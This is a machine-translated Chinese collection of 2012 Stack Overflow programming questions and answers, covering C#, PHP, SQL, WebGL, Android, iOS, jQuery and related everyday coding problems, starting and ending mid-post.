    if (strstr($class, 'OAuth')) require_once ROOT_DIR.'/'.'utils/hybridauth/Hybrid/thirdparty/OAuth/OAuth.php';
    $class = str_replace('Hybrid_', '', $class);
    $class = str_replace('Providers_', '', $class);

    foreach($search as $folder)
    {
            $file = ROOT_DIR.'/'.$folder.'/'.$class.'.php';

            if(file_exists($file)) 
            {
                    require_once $file;
            }
    }
} 
```

算了！在不修改 HybridAuth 的源代码的情况下，我可以尝试怎样让一些东西变得更整洁？

# c# - 调用方法的模式，它采用传递对象的最派生形式

> ID：13572282
> 
> 赞同：4
> 
> 时间：2012-11-26T20:06:23.730
> 
> 标签：c#

当我遇到这种情况并意识到我不确定最好的解决方案是什么时，我感到很惊讶。

假设我有以下三种类型：

```
class A { }
class B : A { }
class C : A { } 
```

以及以下三种方法：

```
DoSomething(A a){ }
DoSomething(B b){ }
DoSomething(C c){ } 
```

我有一个`List<A>`包含 B 和 C 类型的对象

我想这样做：

```
foreach(A a in list) { DoSomething(a) } 
```

并让它调用与底层类型最匹配的方法，但当然这总是会调用`DoSomething(A a)`

我不希望有一堆类型检查来获得正确的方法调用，并且我不想向 A、B 或 C 类添加任何内容。

是否可以？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-26T20:10:26.033

这是静态类型语言中虚拟调度的一个众所周知的问题：它只“虚拟”处理*一个*参数（ ）；`this`对于所有其他参数，方法调用使用参数的*静态类型*进行绑定。由于您的列表是 的列表`A`，因此代码只会调用`A`重载。

您需要[多次分派](http://en.wikipedia.org/wiki/Multiple_dispatch)才能实现既定目标，并且由于除非您切换到 ，否则该语言不会开箱即用地提供此功能`dynamic`，因此您必须自己进行切换或实现它。在做出此决定时（以及在决定*如何*在需要时实现多分派时）需要考虑许多权衡，所以不要轻易这样做。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-26T20:11:13.050

您将付出性能成本，但实现此目的的一种简单方法是使用动态运行时绑定器。只需将参数转换为`dynamic`：

```
foreach(A a in list) { DoSomething((dynamic)a); } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-26T20:11:36.890

如果您愿意使用`dynamic`关键字，我想像

```
DoSomething((dynamic)a); 
```

将为您完成工作。

否则，对于静态类型，您可以说

```
void DoSomething(A a)
{
  var aAsB = a as B;
  if (aAsB != null)
    DoSomething(aAsB);
  var aAsC = a as C;
  if (aAsC != null)
    DoSomething(aAsC);

  // general A case here
} 
```

但这也许就是你所说的一堆类型检查。

# vbscript - 如何在不使用文字调用的情况下获取使用 VBS 的正在运行的应用程序列表？

> ID：13572289
> 
> 赞同：1
> 
> 时间：2012-11-26T20:06:41.843
> 
> 标签：vbscript, ms-word

我们正在使用下面的脚本来终止任何可能干扰信息亭操作的打开窗口。

它使用 word 返回正在运行的应用程序而不是进程的列表。

问题是我在 Word 上调用的脚本并且 word 不断崩溃。似乎应该有一种方法可以做到这一点，而无需呼吁。

这是我正在使用的代码

```
sub closeWindows()
Set Word = CreateObject("Word.Application")
Set Tasks = Word.Tasks
For Each Task in Tasks
If Task.Visible AND Task.Name = "Sign Up for Facebook" Then Task.Close()
If Task.Visible AND Task.Name = "Log In | Facebook: Facebook" Then Task.Close()
Next
Word.Quit
end sub
Do
closeWindows
Wscript.Sleep 1000
Loop 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T18:05:34.450

有两个选项比您建议的解决方案更可取：

1.  锁定/加固信息亭以防止使用不需要的应用程序。
2.  *如果您使用这样的“看门狗”脚本，请使用已知的良好*应用程序填充脚本，而不是您不想要的应用程序。

这两种选择都比保留黑名单更具可持续性。

# jquery - Jquery 只读输入框

> ID：13572292
> 
> 赞同：0
> 
> 时间：2012-11-26T20:06:53.730
> 
> 标签：jquery, html

我有两个（只读）包含动态值的输入文本框。

```
<input class="sum_a" readonly="readonly"  value="0"> 
<input class="sum_b" readonly="readonly"  value="0"> 
```

我想知道每次这些框中的一个或两个框中的值发生变化时，在 Jquery 中执行操作的最佳方法是什么。类似于 的东西`$('select[class=sum_a]').change(function()`，但是由于用户没有与不起作用的框进行交互。

我想只是提取当前值并将其与每次之前的值进行比较。

```
sum_a=  parseInt($("input[class='sum_a']").val()); 
```

谁能提出更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:08:39.847

每次更改值时，都会触发更改事件。

```
$(".sum_a").val("2").triggerHandler("change"); 
```

现在将触发您对所述输入的更改事件。

# ajax - Facebook ajax 丢失会话

> ID：13572303
> 
> 赞同：0
> 
> 时间：2012-11-26T20:07:35.697
> 
> 标签：ajax, facebook

我正在尝试开发 Facebook 应用程序，但遇到了会话变量问题。我通过设置会话变量的 ajax 调用脚本。后来，我通过 ajax 调用了一个脚本，该脚本检索了先前设置的会话变量，但该变量为空。

在 index.php 中加载应用程序时调用的第一个脚本。我在顶部有以下内容

```
<?php
session_start();
//Get PHP SDK
require_once 'facebook-php-sdk/src/facebook.php';
// Create our Application instance.
$facebook = new Facebook( array('appId' => 'xxxxxxxxxxxxxxx',
'secret' => 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', 'cookie' => true, ));
$signed_request = $facebook -> getSignedRequest();
$like_status = $signed_request["page"]["liked"];
?> 
```

通过 ajax 调用的第一个脚本设置会话变量，如下所示：

```
$numbers = range(1, 52);
shuffle($numbers);
$_SESSION['cards'] = serialize($numbers); 
```

第二个脚本（大约 10 秒后调用，所以我认为这不会是种族问题）如下所示：

```
$numbers = unserialize($_SESSION['cards']); 
```

即使没有其他脚本清空 $_SESSION['cards']，变量 $numbers 也是空的。

这应该工作还是我做错了？我对ajax很陌生。我读过 iframe 中的 ajax 调用可能会出现问题，这是 facebook 应用程序的设置方式，但我还没有找到解决方案。

有人知道怎么修这个东西吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:16:16.340

您必须`session_start()`同时调用`index.php`ajax 脚本来共享同一个会话

# video - WebGL 中的视频纹理不起作用

> ID：13572304
> 
> 赞同：2
> 
> 时间：2012-11-26T20:07:38.037
> 
> 标签：video, webgl, textures

我正在从本教程中学习 WebGL：[https](https://developer.mozilla.org/en-US/docs/WebGL/Animating_textures_in_WebGL) ://developer.mozilla.org/en-US/docs/WebGL/Animating_textures_in_WebGL ，在上一课中它展示了如何将视频对象用作纹理。这里有一个活生生的例子：[https](https://developer.mozilla.org/samples/webgl/sample8/index.html) ://developer.mozilla.org/samples/webgl/sample8/index.html工作得很好（我使用的是 Firefox）。问题是当我自己尝试这样做时，我遇到了问题。更奇怪的是，我的电脑（离线）和主机（在线）有不同的错误消息。离线错误：

> file:///C:/Users/NPS/Desktop/gallery/video.html(351): SecurityError: 操作不安全。

其中第 351 行是：

```
gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, videoElement); 
```

Firefox 开发者工具栏还说：

> 错误：WebGL：禁止从未经 CORS 验证的跨域元素加载 WebGL 纹理。请参阅[https://developer.mozilla.org/en/WebGL/Cross-Domain_Textures](https://developer.mozilla.org/en/WebGL/Cross-Domain_Textures)

我已经阅读了有关该错误的信息，但由于 html 和视频文件都在同一个位置，因此它不起作用似乎很奇怪。此外，当我打开页面时，实际上会播放视频文件中的声音（仅此而已）。另一方面，在线版本的错误是不同的（但我不能把它放在这里，因为它是波兰语，我不确定确切的英文版本是什么。但如果你有 Firefox，你可以在这里查看：[http：/ /nps.netarteria.pl/gallery/video.html](http://nps.netarteria.pl/gallery/video.html)（我正在使用firefox开发人员栏）当然，您也可以查看页面的源代码以及我在那里使用的所有内容。

知道我该怎么做才能让它工作吗？我真的很想在我的项目中使用视频纹理，但现在我被卡住了。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-27T08:23:08.353

您的示例的问题是您的视频纹理不是 2 的幂，并且您还没有设置纹理过滤来处理它。

将第 353 行从

```
gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_NEAREST); 
```

到

```
gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR); 
```

并添加这两行

```
gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE); 
```

还要删除对的调用，`gl.generateMipmap(GL_TEXTURE_2D)`因为您无法为非 2 次幂纹理生成 mip。

您可以在 WebGL Wiki 上阅读有关[非 2 次幂纹理的问题](http://www.khronos.org/webgl/wiki/WebGL_and_OpenGL_Differences#Non-Power_of_Two_Texture_Support)

MDN 网站上的示例已经被破坏了很长时间，没有人费心去修复它 :-( 由于 Firefox 中的一个早已被修复的错误，它曾经可以工作。

注意：Chrome 25 (Chrome Canary) 将打印一些有助于指出这一点的消息。当我在 Chrome 25 上运行您的示例时，我收到以下消息

```
WebGL: INVALID_OPERATION: generateMipmap: level 0 not power of 2 or not all the same size video.html:1
WebGL: drawElements: texture bound to texture unit 0 is not renderable. It maybe non-power-of-2 and have incompatible texture filtering or is not 'texture complete' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:43:48.683

对于 Chrome，您可以尝试使用参数“chrome.exe --allow-file-access-from-files”的快捷方式

# java - 在android 4+中加载本地html页面的问题

> ID：13572305
> 
> 赞同：-2
> 
> 时间：2012-11-26T20:07:41.293
> 
> 标签：java, android, webview

我在 android 4 中将本地 html 页面加载到 webView 时遇到问题。之前，我针对 android 2.3 对其进行了测试，结果还可以。我像这样加载页面 webView.loadUrl(file:///android_asset/drawable/test.html) 我阅读了很多关于加载本地页面错误的信息，但我还没有解决这个问题。你能解释一下为什么它不加载页面并写下“网页不可用”。可能是“file:///”或“android_asset”的问题。请给我真正的建议，如何将我的 html 页面加载到 android 4 中的 webview。我真的需要。谢谢你。

PS我确定该文件存在于该文件夹中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T11:43:27.430

我解决了我的问题。我用了：

```
private final int boundaryApiValue = 10; 

/**Function set root directory for current api version.*/ 

    private void setRootPathForCurrentVersionOfAndroid() {
        if (Build.VERSION.SDK_INT >= boundaryApiValue)
            rootPath = "file:///android_res/drawable/";
        else {
            rootPath = "file:///android_asset/res/drawable/";
        }
    } 
```

如果你的版本低于 Android HoneyComb，你应该从“file:///android_asset/res/drawable/”加载 webview 的 html 文件，如果你有 HoneyComb 并且比使用“file:///android_res/drawable/”更晚这对我来说很好。

# sql - SQL 查询能否提供 ColdFusion 可以使用的值？

> ID：13572306
> 
> 赞同：1
> 
> 时间：2012-11-26T20:07:45.057
> 
> 标签：sql, coldfusion

我目前正在构建一个成员调查，每个成员都会获得一个他们用来访问调查的唯一链接。一旦他们访问并提交调查，他们就不能再使用该链接。这是我到目前为止所拥有的：

```
<cfquery name="SurveyTaken" maxrows="1" datasource="#APPLICATION.DATASOURCE#">
        IF EXISTS (SELECT 1 FROM AllMembers WHERE me_number = <cfqueryparam value="#URL.em#" cfsqltype="cf_sql_char">)
        SELECT * FROM MemberSurvey         
        WHERE me_number = <cfqueryparam value="#URL.em#" cfsqltype="cf_sql_char"> 
</cfquery>

<cfif SurveyTaken.recordcount eq 1>

    <p>We are sorry but it seems that you have already taken the survey. This link has been used and is no longer valid.</p> 

<cfelseif SurveyTaken.recordcount eq 0>
    <cfquery name="SurveyIndividual" maxrows="1" datasource="#APPLICATION.DATASOURCE#">        
        SELECT  * 
        FROM    AllMembers         
        WHERE   me_number = <cfqueryparam value="#URL.em#" cfsqltype="cf_sql_char"> 
    </cfquery>

    <cfform action="" method="post" id="addCommentForm" onsubmit="return submit_form()">
    .... etc...
</cfif> 
```

基本上，我希望我的 SQL 查询首先检查成员 ID 是否有效，然后在另一个表中检查成员 ID 是否已经提交。现在，如果在 URL 中发布了有效的成员 ID，则它可以工作，因为它通过了“IF”部分，但如果 IF 部分没有通过，则不会运行任何查询，因此我的 .recordcount 解决方案不起作用。我能做些什么来解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:27:08.307

我在这里做一些假设，因为我不知道您的确切架构。

假设您在名为`membersurvey_id`...

```
SELECT  m.me_number, ISNULL(s.membersurvey_id,0) AS membersurvey_id
FROM allmembers m
    LEFT OUTER JOIN membersurvey s ON m.me_number = s.me_number
WHERE m.me_number = <cfqueryparam value="#url.em" cfsqltype="cf_sql_char"> 
```

记录数 > 0 表示 url.em 有效。如果recordcount > 0，则membersurvey_id > 0 表示调查已经填写完毕。

请注意，我使用了 MSSQL 的`ISNULL`函数。您没有确切指定您使用的是哪种类型的数据库，因此您可能需要使用该函数的更特定于包的版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:20:27.403

我想您在完成调查以使 id 无效时正在记录一些东西？类似的东西`set idValid = 0`。

你可能想做一些更像

```
SELECT * 
FROM 
    MemberSurvey         
WHERE me_number = <cfqueryparam value="#URL.em#" cfsqltype="cf_sql_char"> 
and idValid is NULL 
```

由于这将返回 0 条带有假 ID 或已完成调查的好 ID 的记录，因此您需要反转 cfif 中的 .recordCount 值。

或者，如果您只是从表中删除 ID，只需使用

```
SELECT * 
FROM 
    MemberSurvey         
WHERE me_number = <cfqueryparam value="#URL.em#" cfsqltype="cf_sql_char"> 
```

您仍然需要在您的 cfif 中反转您的 .recordCounts。

# ruby - 使用公共前缀匹配表行 ID

> ID：13572314
> 
> 赞同：0
> 
> 时间：2012-11-26T20:08:04.883
> 
> 标签：ruby, nokogiri, mechanize

这可能只是一个语法问题。

我不清楚如何只匹配 id 以 rowId_ 开头的表行

```
agent = Mechanize.new
  pageC1 = agent.get("/customStrategyScreener!list.action") 
```

该表具有 class=tableCellDT。

```
 pageC1.search('table.tableCellDT tr[@id=rowId_]')  # parses OK but returns 0 rows since rowId_ is not matched exactly.

 pageC1.search('table.tableCellDT tr[@id=rowId_*]')  # Throws an error since * is not treated like a wildcard string match 
```

示例 HTML：

```
 <table id="row" cellpadding="5" class="tableCellDT" cellspacing="1">
<thead>
<tr>
<th class="tableHeaderDT">#</th>
<th class="tableHeaderDT sortable">
<a href="?d-16544-s=1&amp;d-16544-o=2&amp;d-16544-p=1">Screener</a></th>
<th class="tableHeaderDT sortable">
<a href="?d-16544-s=2&amp;d-16544-o=2&amp;d-16544-p=1">Strategy</a></th>
<th class="tableHeaderDT"> </th></tr></thead>
<tbody>
<tr id="rowId_BullPut" class="odd">
<td>   1  </td>
<td>   Bull</td>
<td></td>
<td><a href="link1?model.itemId=2262">Edit</a>&nbsp;&nbsp;
            <a href="javascript:deleteScreener('link2?model.itemId=2262');">Delete</a>&nbsp;&nbsp;
            <a href="link3?model.itemId=2262&amp;amp;model.source=list">View</a>&nbsp;&nbsp;
            </td></tr> 
```

笔记

**pageC1**是一个`Mechanize::Page`对象，而不是`Nokogiri`任何东西。抱歉，一开始不清楚。Mechanize::Page 没有#css 或#xpath 方法，但可以从中提取Nokogiri 文档（无论如何在内部使用）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:27:04.793

要获取以“rowId_”开头的`tr`元素：`id`

```
pageC1.search('//tr[starts-with(@id, "rowId_")]') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:07:53.653

您想要 CSS3[属性以 selector 开头](http://www.w3.org/TR/selectors/#attribute-substrings)：

```
pageC1.css('table.tableCellDT tr[id^="rowId_"]') 
```

或 XPath[`starts-with()`](http://www.w3.org/TR/xpath/#function-starts-with)函数：

```
pageC1.xpath('.//table[@class="tableCellDT"]//tr[starts-with(@id,"rowId_")]') 
```

尽管 Nokogiri[`Node#search`](http://nokogiri.org/Nokogiri/XML/Node.html#method-i-search)方法会根据您编写的内容智能地在 CSS 或 XPath 选择器语法之间进行选择，但这并不意味着您可以在同一个查询中混合使用 CSS 和 XPath 选择器语法。

在行动：

```
>> require 'nokogiri'
#=> true

>> doc = Nokogiri.HTML <<ENDHTML; true #hide output from IRB
">> <table class="foo"><tr id="rowId_nonono"><td>Nope</td></tr></table>
">> <table class="tableCellDT">
">>   <tr id="rowId_yesyes"><td>Yes1</td></tr>
">>   <tr id="rowId_andme2"><td>Yes2</td></tr>
">>   <tr id="rowIdNONONO"><td>Needs underscore</td></tr>
">> </table>
">> ENDHTML
#=> true

>> doc.css('table.tableCellDT tr[id^="rowId_"]').map(&:text)
#=> ["Yes1", "Yes2"]

>> doc.xpath('.//table[@class="tableCellDT"]//tr[starts-with(@id,"rowId_")]').map(&:text)
#=> ["Yes1", "Yes2"] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-27T10:21:28.077

感谢 [http://nokogiri.org/Nokogiri/XML/Node.html#method-i-css](http://nokogiri.org/Nokogiri/XML/Node.html#method-i-css)

和上面的答案，这是解决我的问题的最终代码，即只获取我需要的行，然后只从每个行中读取某些信息：

```
 pageC1.search('//tr[starts-with(@id, "rowId_")]').each do |row|

# Read the string after _ in rowId_, part of the "id" in <tr>
    rid = row.attribute("id").text.split("_")[1] # => "BullPut"

# Get the URL of the 3rd <a> link in <td> cell 4    
    link = row.css("td[4] a[3]")[0].attributes["href"].text # => "link3?model.itemId=2262&amp;amp;model.source=list"
 end 
```

# ios - 在 iOS 中保存有关以前购买的项目的信息

> ID：13572316
> 
> 赞同：1
> 
> 时间：2012-11-26T20:08:15.853
> 
> 标签：ios, nsuserdefaults, icloud

我正在开发一个应用程序，该应用程序具有许多可启用某些功能的应用程序商店购买项目。

购买每件商品后，我需要记住它（当然）。我还想将此信息保留在 iCloud 中，以防应用程序被删除或安装在另一台设备上。

什么是最好的数据结构？

可以使用用户默认数据库吗？

重要的是用户将无权更改这些值并自行启用付费功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:23:02.270

我使用`KeychainItemWrapper`该类将标志存储在钥匙串中。到目前为止，好消息是钥匙串在应用程序删除后仍然存在。如果用户随后在同一设备上重新安装相同的应用程序，钥匙串数据仍然存在。

无需使用 iCloud。如果用户在另一台设备上安装您的应用，您只需在应用中提供“恢复购买”按钮即可。然后调用 Store Kit API 来恢复现有的购买。“In-App Purchasing Programming Guide”涵盖了如何做到这一点。

即使钥匙串中的标志丢失，同样的功能也允许用户恢复他们的购买。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:17:08.270

> 可以使用用户默认数据库吗？

可以，但这不是最好的主意，因为

> 重要的是用户将无权更改这些值并自行启用付费功能。

并将`NSUserDefaults`其内容存储为二进制或纯文本属性列表。在越狱设备上轻松更改。（也可以通过修改 iTunes 备份文件在未越狱的设备上进行更改）。

您可以做的是将它们存储在钥匙串中，尽管钥匙串并不是真正为此设计的（也可以使用 Ptoomey3 很棒的 Kaychain-Dumper 工具将其转储到越狱设备上），或者更好地将其远程存储在您的服务器上并且让您的服务器检查用户购买了什么。

当然，如果不仅是服务器进行检查，例如您不仅根据购买发送或不发送内容，而且您还使用此检查在您的应用程序中执行操作，那么它也可以被黑（谷歌“MobileSubstrate cheat DoodleJump”就是一个很好的例子）。

总而言之：没有绝对安全的系统。

# javascript - 找出 iFrame 的当前 URL

> ID：13572317
> 
> 赞同：0
> 
> 时间：2012-11-26T20:08:19.330
> 
> 标签：javascript, url, iframe

有没有办法找出 iframe 的当前 URL？如果我将警报消息 onload 设置为 document.getElementByTagName("iframe")[0].contentWindow.location.href ，那么每次 iframe 页面更改时，我都会收到当前 url。不幸的是，由于 Javascript 同源政策指南，这在 Chrome 上不起作用。谁能推荐一种替代方法，以便有人在 iframe 中获取页面的当前 URL？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:26:10.660

There could be different approaches to jump over same origin policy:

I would suggest `postMessages` [https://developer.mozilla.org/en-US/docs/DOM/window.postMessage](https://developer.mozilla.org/en-US/docs/DOM/window.postMessage)

should work with Firefox 3.5, Opera 10, Safari 4.0/Chrome 3.0+, Internet Explorer 8.0\. And yet, you have to have access to both domains.

you may also try something like old school `XhrIframeProxy` or even somehow, `Xdomain requests` but I am not sure latter has good support yet

# ant - 如果失败怎么办 由于合并冲突而跳过任何文件？

> ID：13572323
> 
> 赞同：1
> 
> 时间：2012-11-26T20:08:41.623
> 
> 标签：ant, perforce

根据[http://www.perforce.com/perforce/doc.current/manuals/p4ant/p4tasks.html#p4jresolve](http://www.perforce.com/perforce/doc.current/manuals/p4ant/p4tasks.html#p4jresolve)，具有合并冲突的文件将被跳过。在合并冲突的情况下，即使设置 failonerror='true' 也无济于事。

是检查合并冲突以使用的最佳方法：

```
<p4jresolve failonerror='true' forceresolve='true'/> 
```

然后检查冲突标记？如果是这样，这样做的 Ant 语法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T02:59:29.170

正常解析后，存在冲突的文件仍需要解析。因此，您可以`p4jresolve`使用该属性再次运行`showactionsonly`，看看它是否报告了任何需要解析的文件。

我自己没有尝试过，但这就是我只使用命令行的方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-07T22:17:53.587

如果`<p4jresolve/>`不成功（例如由于冲突），`<p4submit/>`将失败。

# java - Thrift：序列化 + 反序列化更改对象

> ID：13572331
> 
> 赞同：1
> 
> 时间：2012-11-26T20:09:06.147
> 
> 标签：java, thrift, thrift-protocol

我有一个这样的节俭结构：

```
struct GeneralContainer {
    1: required string identifier;
    2: required binary data;
} 
```

这个想法是能够在单个“管道”上传递不同类型的节俭对象，并且仍然能够在另一端正确反序列化。

但是序列化一个`GeneralContainer`对象，然后反序列化它会改变`data`字段的内容。我正在使用`TBinaryProtocol`：

```
TSerializer serializer = new TSerializer(new TBinaryProtocol.Factory());
TDeserializer deserializer = new TDeserializer(new TBinaryProtocol.Factory());

GeneralContainer container = new GeneralContainer();
container.setIdentifier("my-thrift-type");
container.setData(ByteBuffer.wrap(serializer.serialize(myThriftTypeObject)));

byte[] serializedContainer = serializer.serialize(container);
GeneralContainer testContainer = new GeneralContainer();
deserializer.deserialize(testContainer, serializedContainer);
Assert.assertEquals(container, testContainer);  // fails 
```

我的猜测是，当我们使用`TBinaryProtocol`. 那是对的吗？如果是，我对协议有哪些选择？我的目标是最小化生成的序列化字节数组的大小。

谢谢，阿曼

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T13:02:57.433

跟踪它到 thrift 0.4 序列化中的一个错误。在 thrift 0.8 中运行良好。

# javascript - Javascript改变元素属性onmouseover onmouseout

> ID：13572332
> 
> 赞同：0
> 
> 时间：2012-11-26T20:09:07.343
> 
> 标签：javascript, html, css

我有这个代码：

```
 <script type="text/javascript">
    $(document).ready(function () {
    $('.thumbspiccolimabelli').hover( function(e){

     var ider = $(this).attr('title');  // e.g. the other element I want to change colour on 
     console.log(ider);

     var test = document.getElementsByClassName(ider);
     for(var i = 0; i < test.length; i++) {
         if(test[i].style.color = 'red'){
            test[i].style.color = 'white';
         }
         else{
            test[i].style.color = 'red';
         }
     }
     console.log(test);

    });
  });
</script> 
```

而且我正在尝试更改页面上所有元素的颜色，这些元素的 id 是我悬停的元素的 id，但它并不完全有效。

我悬停在上面的元素的 ID 为“myhoverelement”，我有共享相同 ID 的跨度元素，我希望改变颜色。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:11:37.693

您不需要为此使用 javascript

CSS：

```
.thumbspiccolimabelli {
    background-color: none;
}

.thumbspiccolimabelli:hover {
    background-color: #fff;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:23:24.933

这是你想要的吗？'#myhoverelement' 被替换为 '.myhoverelement'。ID 必须是唯一的。

```
$('.thumbspiccolimabelli').on('hover' , function() {
    $('.myhoverelement').each(function() {
        $(this).css('background' , '#ffffff');
    });  
}); 
```

# sql - 使用大于下午 4 点的时间选择所有数据

> ID：13572335
> 
> 赞同：10
> 
> 时间：2012-11-26T20:09:23.163
> 
> 标签：sql, sql-server, sql-server-2005

我需要在`datatimestamp`具有两年数据的 SQL Server Management Studio Microsoft SQL Server 2005 - 9.00.4060.00 (X64) DB 表中选择包含时间 > 每天下午 4 点的数据。最好的方法是什么？我的时间戳具有以下格式：`DATETIME, '2005-10-13 16:00:00', 102`. 我每天下午都有随机时间的数据。我需要每天下午 4 点之后获取数据。不只是一天。

例如，我试了一天这样：

```
SELECT     Yield, Date, ProductType, Direct
FROM         MIAC_CCYX
WHERE     (Date < CONVERT(DATETIME, '2005-10-13 16:00:00', 102))  Thanks for help 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-11-26T20:24:53.330

很难阅读您的问题，但假设您确实使用的是`datetime`数据类型，您可以使用它[`datepart`](http://msdn.microsoft.com/en-us/library/ms174420.aspx)来查找时间大于下午 4 点的任何日期：

```
WHERE datepart(hh, YourDate) > 16 
```

由于您现在也需要分钟，如果您想要下午 4:45 之后的记录，您可以将日期转换为如下时间：

**SQL Server 2000/2005**

```
SELECT Yield, [Date], ProductType, Direct 
FROM MIAC_CCYX 
WHERE cast(convert(char(8), [Date], 108) as datetime) > cast('16:45' as datetime) 
```

本质上，您使用[`convert`'s Date 和 Time 样式](http://msdn.microsoft.com/en-us/library/ms187928.aspx)转换日期以将日期转换为时间字符串，然后转换回 a`datetime`以与所需时间进行比较。

**SQL Server 2008+**

```
SELECT Yield, [Date], ProductType, Direct 
FROM MIAC_CCYX 
WHERE CAST([Date] as time) > CAST('16:45' as time) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:40:15.853

无论您的日期是什么，这都会起作用。这不会比较日期。相反， Datepart() 将从 datetime 中提取小时元素并与您的给定时间比较（例如，在您的情况下为下午 4 点）

```
SELECT * from <table> where DATEPART(hh, ModifiedDate) >= 16 
```

我假设 ModifiedDate 作为列名。这将从下午 4 点到晚上 11:59:59 返回数据 编辑：我已经对照 MS SQL Server 2012 进行了检查。它也适用于日期时间格式。

# sql - 笛卡尔连接两个没有记录的表

> ID：13572336
> 
> 赞同：5
> 
> 时间：2012-11-26T20:09:26.720
> 
> 标签：sql, sql-server

我必须将表 A（与税务相关）加入到表 B（与客户相关）

我最多拉 1 条记录，但有时没有记录。

现在我需要将合并的记录返回给用户

我虽然做一个简单的笛卡尔积会起作用

```
SELECT * FROM TableA, TableB 
```

但如果 TableA 或 TableB 为空，这将不起作用

我会做一个完整的外部连接，但现在没有任何东西可以加入。我可以创建带有标识列的临时表，然后加入它们（因为 1 = 1）

但我一直在寻找不同的方式？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T20:11:37.863

根据您自己的建议，您可以使用 a`full outer join`来保证一行：

```
select  *
        TableA a
full outer join
        TableB b
on      1=1 
```

要始终返回至少一行，即使`TableA`和`TableB`是空的，您也可以使用假表：

```
select  *
from    (
        select  1 as col1
        ) fake
left join
        TableA a
on      1=1
left join
        TableB b
on      1=1 
```

# dynamics-crm-2011 - 从控制台应用程序查询实体时绕过插件

> ID：13572337
> 
> 赞同：0
> 
> 时间：2012-11-26T20:09:29.020
> 
> 标签：dynamics-crm-2011

我的插件加密/解密一个字段。在 CRM 表单中的现场工作。

在我的控制台应用程序中，检索绕过了我的插件，例如，它直接从数据库中检索加密值而不运行插件。调试时，从表单访问该字段时会命中插件中的断点，但从我的控​​制台程序访问时不会命中它们。

我很惊讶我的插件不是从程序中调用的。它绕过了我的业务规则。

这是我从程序中访问实体和字段的方式：

```
 private static OrganizationServiceProxy service = null;
    private static OrganizationServiceContext orgSvcContext = null;
    public static void RetrieveSSNs()
    {
        var query = orgSvcContext.CreateQuery("bpa_consumer");
        foreach (Entity consumer in query)
        {
            if (consumer.Attributes.Contains("bpa_ssn"))
            {
                string ssn = consumer["bpa_ssn"].ToString();
                Console.WriteLine(string.Format("Consumer \"{0}\" has SSN {1}", consumer.Attributes["bpa_name"], ssn));
            }
            else
            {
                Console.WriteLine(string.Format("Consumer \"{0}\" doesn't have a SSN", consumer.Attributes["bpa_name"]));
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:19:38.773

我猜你在 Retrieve 方法上注册了插件？如果是这样，请在 RetrieveMultiple 上添加另一个相同的注册。这应该让你的插件在你的 foreach 上执行。我应该警告你，从性能的角度来看，这是一件非常危险的事情......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T19:03:10.783

如果您担心性能，我的建议是将加密数据放入一个单独的实体中并进行查找。使用这种方法，CRM 只需在用户需要访问加密数据时执行 Retrieve/RetrieveMultiple 插件，而不是每次用户访问主记录时。这也将更容易保护加密数据。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-27T15:57:20.930

事实证明，当您查询实体集合时，您必须为事件 RetrieveMultiple 注册您的插件。

# android - 从 ProximityIntentReceiver 发送 SMS

> ID：13572341
> 
> 赞同：1
> 
> 时间：2012-11-26T20:09:56.200
> 
> 标签：android

程序员。我正在做一个 Proximity Alert 应用程序，想知道如何从 ProximityIntentReceiver 发送 SMS 扩展 BroadcastReceiver，即在进入特定半径时自动发送 SMS。

下面是我的 ProximityIntentReceiver 代码，我可以在哪里放置 SMS 活动？

```
package jacojunga.retaildistributortrack;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.location.LocationManager;
import android.util.Log;
import android.widget.Toast;

public class ProximityIntentReceiver extends BroadcastReceiver {

private static final int NOTIFICATION_ID = 1000;
String sender;
IntentFilter intentFilter;

@Override
public void onReceive(Context context, Intent intent) {

    String key = LocationManager.KEY_PROXIMITY_ENTERING;

    Boolean entering = intent.getBooleanExtra(key, false);

    if (entering) {
